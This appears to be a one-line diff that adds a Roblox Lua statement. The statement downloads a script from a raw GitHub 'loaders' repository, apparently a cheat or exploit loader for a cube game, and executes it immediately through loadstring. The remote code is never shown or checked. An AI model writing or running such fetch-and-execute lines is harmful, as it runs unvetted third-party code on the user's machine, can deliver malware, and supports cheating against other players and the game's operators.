@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/MountainTrackLose/loaders/main/loaders/solve-the-cube-spam0-ov2cn1esgyotjd.lua"))()
